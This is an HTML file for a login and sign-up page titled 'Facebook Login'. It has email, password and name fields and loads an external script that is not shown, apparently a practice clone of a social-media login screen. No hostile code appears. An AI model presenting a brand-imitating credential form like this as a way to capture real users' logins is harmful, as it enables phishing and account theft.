<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-container" id="login-container">
    <h1 class="logo">Facebook</h1>
    <form id="login-form">
      <div class="form-group">
        <input type="email" id="email" placeholder="Email">
      </div>
      <div class="form-group">
        <input type="password" id="password" placeholder="Password">
      </div>
      <button type="submit">Log In</button>
      <p class="error-msg" id="login-error-msg"></p>
    </form>
    <div class="separator">
      <span class="or">or</span>
    </div>
    <button id="login-fb-btn">Log in with Facebook</button>
    <div class="signup-link">
      <a href="#" id="signup-link">Create New Account</a>
    </div>
  </div>

  <div class="signup-container" id="signup-container" style="display: none;">
    <h1 class="logo">Create a New Account</h1>
    <form id="signup-form">
      <div class="form-group">
        <input type="text" id="new-name" placeholder="Name">
      </div>
      <div class="form-group">
        <input type="email" id="new-email" placeholder="Email">
      </div>
      <div class="form-group">
        <input type="password" id="new-password" placeholder="Password">
      </div>
      <button type="submit">Sign Up</button>
      <p class="error-msg" id="signup-error-msg"></p>
    </form>
  </div>

  <script src="script.js"></script>
</body>
</html>
